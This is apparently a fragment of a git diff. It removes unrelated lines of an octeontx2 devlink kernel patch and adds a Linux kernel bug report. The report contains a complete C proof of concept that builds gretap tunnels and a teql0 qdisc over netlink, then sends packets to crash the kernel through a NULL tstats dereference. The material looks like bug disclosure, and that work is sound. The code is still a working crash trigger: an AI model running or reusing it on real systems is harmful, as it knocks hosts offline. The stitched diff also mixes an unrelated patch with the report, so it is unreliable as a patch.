--					      ARRAY_SIZE(rvu_af_dl_param_defrag));
-+		err = devlink_params_register(dl, rvu_af_dl_cn20k_params,
-+					      ARRAY_SIZE(rvu_af_dl_cn20k_params));
- 		if (err) {
- 			dev_err(rvu->dev,
--				"devlink defrag params register failed with error %d",
-+				"devlink cn20k params register failed with error %d",
- 				err);
--			goto err_dl_defrag;
-+			goto err_dl_cn20k_params;
- 		}
- 	}
- 
-@@ -1695,10 +1767,10 @@ int rvu_register_dl(struct rvu *rvu)
- 
- err_dl_exact_match:
- 	if (is_cn20k(rvu->pdev))
--		devlink_params_unregister(dl, rvu_af_dl_param_defrag,
--					  ARRAY_SIZE(rvu_af_dl_param_defrag));
-+		devlink_params_unregister(dl, rvu_af_dl_cn20k_params,
-+					  ARRAY_SIZE(rvu_af_dl_cn20k_params));
- 
--err_dl_defrag:
-+err_dl_cn20k_params:
- 	devlink_params_unregister(dl, rvu_af_dl_params, ARRAY_SIZE(rvu_af_dl_params));
- 
- err_dl_health:
-@@ -1717,8 +1789,8 @@ void rvu_unregister_dl(struct rvu *rvu)
- 	devlink_params_unregister(dl, rvu_af_dl_params, ARRAY_SIZE(rvu_af_dl_params));
- 
- 	if (is_cn20k(rvu->pdev))
--		devlink_params_unregister(dl, rvu_af_dl_param_defrag,
--					  ARRAY_SIZE(rvu_af_dl_param_defrag));
-+		devlink_params_unregister(dl, rvu_af_dl_cn20k_params,
-+					  ARRAY_SIZE(rvu_af_dl_cn20k_params));
- 
- 	/* Unregister exact match devlink only for CN10K-B */
- 	if (rvu_npc_exact_has_match_table(rvu))
--- 
-2.43.0
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <linux/netlink.h>
+#include <linux/rtnetlink.h>
+#include <linux/if_link.h>
+#include <linux/if_tunnel.h>
+#include <linux/neighbour.h>
+#include <linux/pkt_sched.h>
+#include <arpa/inet.h>
 
+extern unsigned int if_nametoindex(const char *__ifname);
+
+#ifndef IFF_UP
+#define IFF_UP 0x1
+#endif
+
+struct nlmsg {
+    char *pos;
+    int nesting;
+    struct nlattr *nested[8];
+    char buf[8192];
+};
+
+static void nl_init(struct nlmsg *nlmsg, int typ, int flags,
+                    const void *data, int size)
+{
+    memset(nlmsg, 0, sizeof(*nlmsg));
+    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
+    hdr->nlmsg_type = typ;
+    hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
+    memcpy(hdr + 1, data, size);
+    nlmsg->pos = (char *)(hdr + 1) + NLMSG_ALIGN(size);
+}
+
+static void nl_attr(struct nlmsg *nlmsg, int typ, const void *data, int size)
+{
+    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
+    attr->nla_len = sizeof(*attr) + size;
+    attr->nla_type = typ;
+    if (size > 0) memcpy(attr + 1, data, size);
+    nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
+}
+
+static void nl_nest(struct nlmsg *nlmsg, int typ)
+{
+    struct nlattr *attr = (struct nlattr *)nlmsg->pos;
+    attr->nla_type = typ;
+    nlmsg->pos += sizeof(*attr);
+    nlmsg->nested[nlmsg->nesting++] = attr;
+}
+
+static void nl_done(struct nlmsg *nlmsg)
+{
+    struct nlattr *attr = nlmsg->nested[--nlmsg->nesting];
+    attr->nla_len = nlmsg->pos - (char *)attr;
+}
+
+static int nl_send(struct nlmsg *nlmsg, int sock)
+{
+    struct nlmsghdr *hdr = (struct nlmsghdr *)nlmsg->buf;
+    hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;
+    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
+    ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
+                       (struct sockaddr *)&addr, sizeof(addr));
+    if (n != (ssize_t)hdr->nlmsg_len) return -1;
+    n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
+    if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr)))
+        return -1;
+    hdr = (struct nlmsghdr *)nlmsg->buf;
+    if (hdr->nlmsg_type == NLMSG_ERROR) {
+        int err = -((struct nlmsgerr *)(hdr + 1))->error;
+        if (err) { errno = err; return -err; }
+    }
+    return 0;
+}
+
+static int dev_updown(int sock, struct nlmsg *nlmsg, const char *name, int up)
+{
+    struct ifinfomsg hdr = {};
+    hdr.ifi_index = if_nametoindex(name);
+    if (!hdr.ifi_index) return -1;
+    hdr.ifi_flags = up ? IFF_UP : 0;
+    hdr.ifi_change = IFF_UP;
+    nl_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
+    int ret = nl_send(nlmsg, sock);
+    printf("  %s %s: %s\n", up ? "up" : "down", name, ret ? strerror(errno) : "ok");
+    return ret;
+}
+
+static int add_addr4(int sock, struct nlmsg *nlmsg, const char *dev,
+                     const char *addr_str, int prefix)
+{
+    struct ifaddrmsg hdr = {};
+    hdr.ifa_family = AF_INET;
+    hdr.ifa_prefixlen = prefix;
+    hdr.ifa_index = if_nametoindex(dev);
+    struct in_addr addr;
+    inet_pton(AF_INET, addr_str, &addr);
+    nl_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
+    nl_attr(nlmsg, IFA_LOCAL, &addr, sizeof(addr));
+    nl_attr(nlmsg, IFA_ADDRESS, &addr, sizeof(addr));
+    int ret = nl_send(nlmsg, sock);
+    printf("  addr %s %s/%d: %s\n", dev, addr_str, prefix, ret ? strerror(errno) : "ok");
+    return ret;
+}
+
+static int add_neigh4(int sock, struct nlmsg *nlmsg, const char *dev,
+                      const char *addr_str, const unsigned char *mac)
+{
+    struct ndmsg hdr = {};
+    hdr.ndm_family = AF_INET;
+    hdr.ndm_ifindex = if_nametoindex(dev);
+    hdr.ndm_state = 0x80; /* NUD_PERMANENT */
+    nl_init(nlmsg, RTM_NEWNEIGH, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
+    struct in_addr addr;
+    inet_pton(AF_INET, addr_str, &addr);
+    nl_attr(nlmsg, NDA_DST, &addr, sizeof(addr));
+    nl_attr(nlmsg, NDA_LLADDR, mac, 6);
+    int ret = nl_send(nlmsg, sock);
+    printf("  neigh %s %s: %s\n", dev, addr_str, ret ? strerror(errno) : "ok");
+    return ret;
+}
+
+static int create_gretap(int sock, struct nlmsg *nlmsg, const char *name,
+                         uint32_t remote)
+{
+    struct ifinfomsg hdr = {};
+    nl_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr, sizeof(hdr));
+    nl_attr(nlmsg, IFLA_IFNAME, name, strlen(name) + 1);
+    nl_nest(nlmsg, IFLA_LINKINFO);
+    nl_attr(nlmsg, IFLA_INFO_KIND, "gretap", 6);
+    nl_nest(nlmsg, IFLA_INFO_DATA);
+    nl_attr(nlmsg, IFLA_GRE_REMOTE, &remote, sizeof(remote));
+    nl_done(nlmsg);
+    nl_done(nlmsg);
+    int ret = nl_send(nlmsg, sock);
+    printf("  create gretap %s: %s\n", name, ret ? strerror(errno) : "ok");
+    return ret;
+}
+
+static int replace_qdisc_teql(int sock, struct nlmsg *nlmsg, const char *dev)
+{
+    struct tcmsg hdr = {};
+    hdr.tcm_family = AF_UNSPEC;
+    hdr.tcm_ifindex = if_nametoindex(dev);
+    hdr.tcm_handle = 0;
+    hdr.tcm_parent = 0xFFFFFFFF; /* TC_H_ROOT */
+
+    nl_init(nlmsg, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_REPLACE, &hdr, sizeof(hdr));
+    nl_attr(nlmsg, TCA_KIND, "teql0", 6);
+    int ret = nl_send(nlmsg, sock);
+    printf("  qdisc %s -> teql0: %s\n", dev, ret ? strerror(errno) : "ok");
+    return ret;
+}
+
+int main(void)
+{
+    printf("[*] PoC: TEQL iptunnel_xmit NULL tstats crash\n");
+    printf("[*] Bug: teql_master_xmit doesn't set skb->dev to slave device\n");
+    printf("[*]      before calling netdev_start_xmit(skb, slave).\n");
+    printf("[*]      So iptunnel_xmit() reads skb->dev = teql0 (master),\n");
+    printf("[*]      but teql0->tstats is NULL -> page fault.\n\n");
+
+    int sock = socket(AF_NETLINK, SOCK_RAW, 0);
+    if (sock < 0) { perror("socket"); return 1; }
+
+    struct nlmsg nlmsg;
+    struct in_addr remote;
+    unsigned char fake_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
+
+    printf("[*] Step 1: Bring up loopback\n");
+    dev_updown(sock, &nlmsg, "lo", 1);
+
+    printf("[*] Step 2: Create gretap tunnels\n");
+    int num = 3;
+    char gname[16], rstr[32];
+    for (int i = 0; i < num; i++) {
+        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
+        snprintf(rstr, sizeof(rstr), "10.1.1.%d", i + 2);
+        inet_pton(AF_INET, rstr, &remote);
+        create_gretap(sock, &nlmsg, gname, remote.s_addr);
+    }
+
+    printf("[*] Step 3: Bring up gretaps and attach teql0 qdisc\n");
+    for (int i = 0; i < num; i++) {
+        snprintf(gname, sizeof(gname), "gretap%d", i + 1);
+        dev_updown(sock, &nlmsg, gname, 1);
+        replace_qdisc_teql(sock, &nlmsg, gname);
+    }
+
+    printf("[*] Step 4: Configure teql0\n");
+    dev_updown(sock, &nlmsg, "teql0", 1);
+    add_addr4(sock, &nlmsg, "teql0", "10.1.1.1", 24);
+
+    printf("[*] Step 5: Add ARP entries\n");
+    for (int i = 0; i < num; i++) {
+        snprintf(rstr, sizeof(rstr), "10.1.1.%d", i + 2);
+        fake_mac[5] = 0x55 + i;
+        add_neigh4(sock, &nlmsg, "teql0", rstr, fake_mac);
+    }
+
+    printf("[*] Step 6: Send multicast through teql0 to trigger crash\n");
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd >= 0) {
+        setsockopt(fd, SOL_SOCKET, 25 /* SO_BINDTODEVICE */, "teql0", 6);
+        int ttl = 1;
+        setsockopt(fd, IPPROTO_IP, 33 /* IP_MULTICAST_TTL */, &ttl, sizeof(ttl));
+
+        struct sockaddr_in dst = {};
+        dst.sin_family = AF_INET;
+        dst.sin_port = htons(9999);
+        inet_pton(AF_INET, "224.0.0.1", &dst.sin_addr);
+
+        char buf[64] = "trigger";
+        for (int i = 0; i < 5; i++) {
+            ssize_t n = sendto(fd, buf, sizeof(buf), 0,
+                               (struct sockaddr *)&dst, sizeof(dst));
+            printf("  send #%d: %zd (%s)\n", i, n, n < 0 ? strerror(errno) : "ok");
+            usleep(100000);
+        }
+        close(fd);
+    }
+
+    printf("[*] Also try unicast\n");
+    fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd >= 0) {
+        struct sockaddr_in dst = {};
+        dst.sin_family = AF_INET;
+        dst.sin_port = htons(9999);
+        inet_pton(AF_INET, "10.1.1.2", &dst.sin_addr);
+
+        char buf[64] = "trigger";
+        for (int i = 0; i < 5; i++) {
+            ssize_t n = sendto(fd, buf, sizeof(buf), 0,
+                               (struct sockaddr *)&dst, sizeof(dst));
+            printf("  send #%d: %zd (%s)\n", i, n, n < 0 ? strerror(errno) : "ok");
+            usleep(100000);
+        }
+        close(fd);
+    }
+
+    printf("[*] Done. Check dmesg for BUG/Oops.\n");
+    sleep(3);
+    close(sock);
+    return 0;
+}
+```
+
+Thanks,
+Xiang
